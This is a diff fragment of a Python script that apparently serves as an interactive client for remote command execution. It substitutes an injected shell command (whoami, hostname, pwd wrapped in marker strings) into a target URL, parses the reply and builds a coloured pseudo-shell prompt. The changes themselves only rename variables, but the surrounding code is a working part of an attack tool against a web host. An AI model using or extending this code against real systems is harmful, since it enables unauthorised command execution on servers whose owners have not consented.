@@ -11,15 +11,15 @@ else:
 	exit()
 	
 try:
-
 	reg = """\]LEDEBUT\]([\s\S]*)\]LAFIN\]"""
 
 	req = httpx.get(host.replace("WRAP", "echo -n ]LEDEBUT]$(whoami)[$(hostname)[$(pwd)]LAFIN]"))
-	prefixes = re.compile(reg).findall(req.text)
-	if not prefixes:
+	matches = re.compile(reg).findall(req.text)
+	if not matches:
 		print("Req.text not found!\n")
 		exit(-1)
-	path = prefixes[0].split("[")[2]
+	prefixes = matches[0].split("[")
+	path = prefixes[2]
 	prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
 	print("")
 
